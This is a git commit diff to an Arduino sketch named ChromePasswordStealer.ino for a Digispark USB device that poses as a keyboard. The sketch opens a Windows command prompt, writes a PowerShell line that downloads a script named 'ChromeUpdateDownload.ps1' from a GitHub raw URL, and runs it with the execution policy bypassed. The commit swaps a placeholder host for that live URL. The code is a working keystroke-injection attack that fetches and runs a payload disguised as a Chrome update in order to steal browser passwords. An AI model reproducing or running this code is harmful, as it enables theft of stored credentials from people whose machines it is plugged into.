afc009541cea23ee41838b8e466827fbef30f807
abdulaziesmuslim <abdulazies55@gmail.com>
2020-05-19 17:18:21 +0700

    Update ChromePasswordStealer.ino

--- ChromePasswordStealer/ChromePasswordStealer.ino
+++ ChromePasswordStealer/ChromePasswordStealer.ino
@@ -12,7 +12,7 @@ void setup()
   DigiKeyboard.println("cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);  
-  DigiKeyboard.println("cd / & mkdir chrome & cd chrome & echo (wget '(YOUR FILE HOST)/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
+  DigiKeyboard.println("cd / & mkdir chrome & cd chrome & echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
   DigiKeyboard.delay(50);
   DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
   DigiKeyboard.delay(20);  
